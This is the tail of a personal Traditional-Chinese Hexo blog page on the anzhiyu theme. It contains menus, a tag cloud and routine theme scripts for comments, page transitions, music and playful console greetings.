faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size:.9em"></i><span> 分類</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size:.9em"></i><span> 標籤</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>朋友</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size:.9em"></i><span> 夥伴們</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size:.9em"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>關於</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size:.9em"></i><span> 本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size:.9em"></i><span> 碎碎念</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size:.9em"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AIS3/" style="font-size:.88rem">AIS3<sup>1</sup></a><a href="/tags/Hexo/" style="font-size:.88rem;font-weight:500;color:var(--anzhiyu-lighttext)">Hexo<sup>2</sup></a><a href="/tags/Zerojudge/" style="font-size:.88rem">Zerojudge<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/" style="font-size:.88rem">前端開發<sup>2</sup></a><a href="/tags/%E8%B3%87%E5%AE%89/" style="font-size:.88rem">資安<sup>2</sup></a></div></div><hr></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="閱讀模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="簡繁轉換">繁</button><button id="darkmode" type="button" title="淺色和深色模式轉換"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="單欄和雙欄切換"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="設定"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目錄"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直達評論"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到頂部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜尋</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span> 資料庫載入中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜尋文章" type="text"></div></div><hr><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size:1rem"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>複製文字</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>貼上文字</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到留言</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新視窗打開</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>複製連結地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>複製圖片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下載圖片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新視窗打開圖片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站內搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜尋</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切換到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切換到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;null&quot;, &quot;_blank&quot;);" style="display:none"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>複製歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>文章分類</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章標籤</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>複製網址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">關閉留言</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為簡體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("10/04/2025 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `歡迎使用安知魚!`,
    `生活明朗, 萬物可愛`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上線",
    dnum,
    "天",
    "©2025 By 安知鱼 V1.6.14",
  ];
  const ascll2 = [`NCC2-036`, `調用前置鏡頭拍照成功，識別為【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在看 伊藤蒼太 的部落格.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打開控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你在被FBI監控(X).", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  let initFn = window.walineFn || null

  const initWaline = (Fn) => {
    const waline = Fn(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://web-eight-weld-65.vercel.app',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
      imageUploader: true,
    }, {"lang":"zh-TW","emoji":["https://unpkg.com/@waline/emojis@1.2.0/weibo","https://unpkg.com/@waline/emojis@1.2.0/alus","https://unpkg.com/@waline/emojis@1.2.0/bilibili","https://unpkg.com/@waline/emojis@1.2.0/qq","https://unpkg.com/@waline/emojis@1.2.0/tieba","https://unpkg.com/@waline/emojis@1.2.0/tw-emoji"],"meta":["nick","mail","link"],"requiredMeta":["nick","mail"],"avatar":"mp","avatarCDN":"https://sdn.geekzu.org/avatar/","login":"enable","wordLimit":0,"pageSize":10,"locale":{"placeholder":"歡迎留言討論！請遵守網路禮儀","sofa":"來做第一個評論的人吧！","submit":"提交","reply":"回覆","cancelReply":"取消回覆","comment":"留言","refresh":"重新整理","more":"載入更多...","preview":"預覽","emoji":"表情","uploadImage":"上傳圖片","nick":"暱稱","nickError":"暱稱不能少於3個字符","mail":"郵箱","mailError":"請填寫正確的郵件地址","link":"網站","optional":"可選","gifSearchPlaceholder":"搜尋 GIF","profile":"個人資料","admin":"管理員","sticky":"置頂","word":"字","wordHint":"評論字數限制：$0","anonymous":"匿名","login":"登錄","logout":"登出","signed":"已登錄","approve":"通過","waiting":"待審核","spam":"垃圾","unsticky":"取消置頂","oldest":"按時間正序","latest":"按時間倒序","hottest":"按熱度排序","reactionTitle":"你認為這篇文章怎麼樣？"}}))

    const destroyWaline = () => {
      waline.destroy()
    }

    anzhiyu.addGlobalFn('pjax', destroyWaline, 'destroyWaline')
  }

  const loadWaline = async () => {
    if (initFn) initWaline(initFn)
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@3.1.3/dist/waline.css')
      if (true) await getCSS('https://cdn.cbd.int/@waline/client@3.1.3/dist/waline-meta.css')
      const { init } = await import('https://cdn.cbd.int/@waline/client@3.1.3/dist/waline.js')
      initFn = init || Waline.init
      initWaline(initFn)
      window.walineFn = initFn
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[圖片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[連結]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[程式碼]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '沒有評論'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('https://web-eight-weld-65.vercel.app/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "無法獲取評論，請確認相關配置是否正確"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail=""</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js" onerror="console.warn(&quot;QRCode 庫載入失敗，QR 功能將不可用&quot;);"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!1,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>